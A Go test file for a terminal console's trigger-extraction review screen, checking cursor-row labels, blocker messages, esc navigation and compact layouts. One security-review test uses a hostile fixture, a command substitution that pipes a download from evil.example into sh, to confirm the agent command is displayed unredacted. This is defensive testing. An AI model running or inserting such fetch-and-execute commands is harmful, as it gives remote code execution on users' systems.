package tui

import (
	"context"
	"errors"
	"fmt"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/seamark-dev/seamark/internal/agent"
	"github.com/seamark-dev/seamark/internal/learning"
	"github.com/seamark-dev/seamark/internal/tui/ui"
)

// The tests of the review step of the trigger extraction record: the
// plan text and its blockers, the cursor row, the agent command, and
// esc back to the origin. They hold review findings. Each test drives
// the record through the harness and checks that the text says what the
// engine does.

func TestExtractReviewTellsHowAnAnswerChangesPendingRegions(t *testing.T) {
	p := extPreview(extMixed())
	h := extOpen(t, extFake(p, extNoRun(t)), p, 120, 40)

	// p22 is the second row; its coverage differs from its regions.
	h.press("down")
	h.resize(80, 120)
	h.press("tab")

	flat := lesBoxFlat(h.view())
	assert.Contains(t, flat, "If answered a confirmed trigger replaces the regions with its own region; a negative "+
		"or unconfirmed answer sets internal/apix, internal/db")
	assert.NotContains(t, flat, "narrow")
}

func TestExtractReviewNamesTheCursorRow(t *testing.T) {
	p := extPreview(extPreviewOpts{rows: extRows()[4:]})
	h := newHarness(t, extFake(p, extNoRun(t)), 120, 40)

	// The sender of the request sets the flag when no row is marked.
	h.send(openExtractMsg{req: p.Request, cursor: true})

	rec := extRecOf(t, h)
	require.True(t, rec.cursor)
	require.Equal(t, stepPreview, rec.step)

	assert.Contains(t, h.view(), "selected 1 (cursor row)")
	assert.Contains(t, extTallFlat(h), "Selected 1 eligible of 1 · the cursor row; no row is marked")

	h.resize(80, 24)
	assert.Contains(t, h.view(), "1 selected (cursor row)", "the compact context line names it too")

	// A request of marked rows names no cursor row.
	h.resize(120, 40)
	h.send(openExtractMsg{req: p.Request})
	require.NotSame(t, rec, extRecOf(t, h))
	assert.NotContains(t, h.view(), "cursor row")
}

func TestExtractWorkDirBlockerOffersNoSettingsLink(t *testing.T) {
	// The engine builds this line from WorkDirErr (learning.workDirBlocker).
	const cwd = "the agent's working directory is unknown: getwd: no such file or directory"

	cases := []struct {
		name     string
		blockers []string
		link     bool
	}{
		{name: "working directory only", blockers: []string{cwd}},
		{name: "with an agent blocker", blockers: []string{cwd, `agent cli "claude" not found on PATH`}, link: true},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			o := extMixed()
			o.blockers = c.blockers
			o.workDirErr = errors.New("getwd: no such file or directory")

			p := extPreview(o)
			h := extOpen(t, extFake(p, extNoRun(t)), p, 120, 40)

			flat := extTallFlat(h)
			assert.Contains(t, flat, cwd+". The agent runs in the directory of the console, so Settings cannot "+
				"change it. Quit, then start Seamark again from an existing directory.")
			assert.NotContains(t, flat, "directory. Install it", "the install advice belongs to the agent blocker")

			footer := footerLine(h.view())
			h.press("o")

			if !c.link {
				assert.NotContains(t, footer, "o open", "Settings cannot fix the working directory")
				assert.Equal(t, destLessons, h.m.active, "o opens nothing")
				assert.Equal(t, lesRun, hookLessons(h).sub)

				return
			}

			assert.Contains(t, flat, `agent cli "claude" not found on PATH. Install it, or press o`)
			assert.Contains(t, footer, "o open Settings › Inference")
			assert.Equal(t, destSettings, h.m.active)
		})
	}
}

func TestExtractNotReadyKeepsItsLastSentenceAtTheMinimumSize(t *testing.T) {
	f := extFake(extPreview(extMixed()), extNoRun(t))
	f.planExtract = func(learning.ExtractRequest) (*learning.ExtractPreview, error) {
		return nil, fmt.Errorf("%w: index database /work/repo/.seamark/index.db is absent: build the index first",
			learning.ErrExtractNotReady)
	}

	h := extOpen(t, f, extPreview(extMixed()), ui.MinWidth, ui.MinHeight)

	frame := h.view()
	assertFrame(t, frame, ui.MinWidth, ui.MinHeight)

	flat := lesBoxFlat(frame)
	assert.Contains(t, flat, "The index is not ready")
	assert.Contains(t, flat, "index database /work/repo/.seamark/index.db is absent: build the index first")
	assert.NotContains(t, flat, "not ready for trigger extraction", "the title already says it")
	assert.Contains(t, flat, "Press o to build it from Overview, then plan again. Nothing was sent or written.")
}

func TestExtractEmptySelectionListsNoItem(t *testing.T) {
	p := extPreview(extPreviewOpts{none: true})
	h := newHarness(t, extFake(p, extNoRun(t)), 80, 40)
	h.send(openExtractMsg{req: learning.ExtractRequest{}})

	flat := lesBoxFlat(h.view())
	assert.Contains(t, flat, "Nothing was selected, so nothing can be asked.")
	assert.NotContains(t, flat, "every selected proposal is asked", "an empty selection has no item to list")
	assert.Contains(t, flat, "Nothing was sent to the agent.")
}

// The tests below hold the findings of the full review, the real-binary
// trial and the security lens of the trigger extraction record. Each
// test drives the record through the harness and checks that the screen
// says what the engine and the ledger hold.

// Trial step 40: the compact Proposals pane of the review dropped the
// scope summary while y still started the run (contracts D-24).
func TestExtractCompactProposalsPaneKeepsTheScope(t *testing.T) {
	p := extPreview(extMixed())

	for _, size := range [][2]int{{ui.MinWidth, ui.MinHeight}, {80, 24}} {
		h := extOpen(t, extFake(p, extNoRun(t)), p, size[0], size[1])
		h.press("tab")
		require.True(t, extRecOf(t, h).prev.listOpen, "size %v shows the Proposals pane", size)

		for _, stage := range []string{"top", "scrolled"} {
			frame := h.view()
			assertFrame(t, frame, size[0], size[1])
			assert.Contains(t, frame, "Sends 5 proposals in 1 batch · 4 ineligible", "%v %s", size, stage)
			assert.Contains(t, frame, "Nothing is sent until you press y.", "%v %s", size, stage)
			assert.Contains(t, frame, "╭─ Proposals", "%v %s", size, stage)

			h.press("down", "down", "down", "down")
		}
	}
}

// Security review: the Agent row hid a command substitution behind
// "[REDACTED]", and y runs that code.
func TestExtractReviewShowsShellCodeInTheAgentCommand(t *testing.T) {
	hostile := `MY_TOKEN="$(curl -s https://evil.example/x | sh)" claude -p`

	p := extPreview(extMixed())
	p.Invocation = agent.CommandSpec{Name: "custom", Argv: []string{"sh", "-c", hostile}}

	h := extOpen(t, extFake(p, extNoRun(t)), p, 120, 40)

	flat := extTallFlat(h)
	assert.Contains(t, flat, "sh -c "+hostile+" · custom agent.argv")
	assert.NotContains(t, flat, "[REDACTED]")
}

// The tests below cover items that join two parts of the console. So
// each test drives the real model through the harness, from the key
// that the user presses to the frame that the user sees.

// C0 item 1, contracts D-15: the Proposals sub-view tells the review
// whether the cursor row stands in for an empty selection.
func TestExtractReviewNamesTheCursorRowFromProposals(t *testing.T) {
	var reqs []learning.ExtractRequest

	f := newFake()
	f.ledger = lesLedger()
	f = extPlanFake(f, f.ledger.Pending, &reqs)
	f.runExtract = extNoRun(t)

	h := lesOpen(t, f, 120, 40)

	// Nothing is marked, so the cursor row p1 is the target.
	h.press("t")
	require.Len(t, reqs, 1)
	assert.Equal(t, []int64{1}, reqs[0].IDs)
	require.Equal(t, stepPreview, extRecOf(t, h).step)
	assert.True(t, extRecOf(t, h).cursor)
	assert.Contains(t, h.view(), "selected 1 (cursor row)")
	assert.Contains(t, extTallFlat(h), "Selected 1 eligible of 1 · the cursor row; no row is marked")

	// esc returns to the origin, as the shell fix of slice B1 does.
	h.press("esc")
	require.Equal(t, lesProposals, hookLessons(h).sub)

	// Marked rows are the targets, so the review names no cursor row.
	h.press("space", "down", "space", "t")
	require.Len(t, reqs, 2)
	assert.Equal(t, []int64{1, 2}, reqs[1].IDs)
	assert.False(t, extRecOf(t, h).cursor)
	assert.NotContains(t, h.view(), "cursor row")
	assert.NotContains(t, extTallFlat(h), "cursor row")

	h.press("esc")
	assert.Equal(t, lesProposals, hookLessons(h).sub, "a marked request returns to its origin too")
	assert.Zero(t, f.callCount("RunExtract"))
}

// C0 item 1, contracts D-15: the Pins sub-view tells the review whether
// the cursor pin stands in for an empty selection.
func TestExtractReviewNamesTheCursorRowFromPins(t *testing.T) {
	var reqs []learning.ExtractRequest

	f := extPlanFake(pinsFake(), linkedPinRows(pinsInspection()), &reqs)
	f.runExtract = extNoRun(t)

	h := pinsOpen(t, f, 120, 40)

	// Pin 2 has an open question, so t asks about its proposal p9.
	pinsCursorTo(h, 2)
	require.True(t, maintHasKey(h, "t"))

	h.press("t")
	require.Len(t, reqs, 1)
	assert.Equal(t, []int64{9}, reqs[0].IDs)
	assert.True(t, extRecOf(t, h).cursor)
	assert.Contains(t, h.view(), "selected 1 (cursor row)")
	assert.Contains(t, extTallFlat(h), "the cursor row; no row is marked")

	h.press("esc")
	require.Equal(t, lesPins, hookLessons(h).sub, "esc returns to Pins")

	// A marked pin is the target, so the review names no cursor row.
	pinsCursorTo(h, 2)
	h.press("space")
	require.Len(t, pinsOf(h).selected, 1)

	h.press("t")
	require.Len(t, reqs, 2)
	assert.Equal(t, []int64{9}, reqs[1].IDs)
	assert.False(t, extRecOf(t, h).cursor)
	assert.NotContains(t, h.view(), "cursor row")
	assert.NotContains(t, extTallFlat(h), "cursor row")

	h.press("esc")
	assert.Equal(t, lesPins, hookLessons(h).sub)
	assert.Zero(t, f.callCount("RunExtract"))
}

// C0 item 1: n on a result prepares the open questions that the run
// left. The run chose those IDs, so the new review names no cursor row,
// also when the first review came from a cursor row.
func TestExtractPrepareRemainingNamesNoCursorRow(t *testing.T) {
	var (
		seen []*learning.ExtractPreview
		ctxs []context.Context
	)

	p := extPreview(extTwoBatches())
	f := extFake(p, nil)
	f.runExtract = extReturns(&seen, &ctxs, extConflictExec)

	h := newHarness(t, f, 120, 40)
	h.send(openExtractMsg{req: p.Request, cursor: true})
	require.True(t, extRecOf(t, h).cursor)

	h.press("y")

	first := extRecOf(t, h)
	require.Equal(t, stepResult, first.step)
	require.NotEmpty(t, first.remaining())

	h.press("n")

	next := extRecOf(t, h)
	require.NotSame(t, first, next, "n opens a new review")
	assert.Equal(t, stepPreview, next.step)
	assert.False(t, next.cursor)
	assert.NotContains(t, h.view(), "cursor row")
}

// The tests below hold review fixes. Each test drives the real model
// through the harness, so it proves the fix where the user sees it.

// Review fix: esc on an extraction review left Lessons on a Run view
// that the tab line no longer listed. It now returns to the sub-view
// that asked for the review.
func TestExtractReviewEscReturnsToItsOrigin(t *testing.T) {
	var reqs []learning.ExtractRequest

	// From Proposals.
	f := propExtractFake(&reqs)
	h := lesOpen(t, f, 120, 40)
	les := hookLessons(h)

	h.press("t")
	require.Equal(t, lesRun, les.sub)
	require.Contains(t, lesSubTabs(h), "Run")

	h.press("esc")
	assert.Nil(t, runViewOf(h).cur, "the review did no work, so it leaves no record")
	assert.Equal(t, lesProposals, les.sub, "esc returns to Proposals")
	assert.NotContains(t, h.view(), "No run in this session")
	assert.NotContains(t, lesSubTabs(h), "Run", "the tab line lists the visible sub-view")

	// Lessons opens on the same sub-view later.
	h.press("1", "3")
	assert.Equal(t, lesProposals, les.sub)

	// From Pins, at the compact size. The request is the one that t
	// sends in Pins; the shell reads only the sub-view that sent it.
	fp := propExtractFake(&reqs)
	hp := lesOpen(t, fp, 80, 24)
	lp := hookLessons(hp)

	hp.press("m")
	hp.send(openExtractMsg{req: learning.ExtractRequest{IDs: []int64{4}}})
	require.Equal(t, lesRun, lp.sub)

	hp.press("esc")
	assert.Equal(t, lesPins, lp.sub, "esc returns to Pins")
	assertFrame(t, hp.view(), 80, 24)
}

// With an earlier record in the session, the Run tab stays, and esc on a
// new review still returns to its origin instead of the earlier record.
func TestExtractReviewEscReturnsToItsOriginAfterAnEarlierRun(t *testing.T) {
	var reqs []learning.ExtractRequest

	f := propExtractFake(&reqs)
	h := lesOpen(t, f, 120, 40)
	les := hookLessons(h)

	earlier := newExtractRecord(h.m.st, learning.ExtractRequest{IDs: []int64{9}})
	h.m.st.lastRunKind = runExtract
	runViewOf(h).past = []runRecord{earlier}

	h.press("p", "t")
	require.Equal(t, lesRun, les.sub)

	h.press("esc")
	assert.Equal(t, lesProposals, les.sub)
	assert.Same(t, earlier, runViewOf(h).cur, "the earlier record is current again")
	assert.Contains(t, lesSubTabs(h), "Run", "the Run tab stays for the earlier record")
}
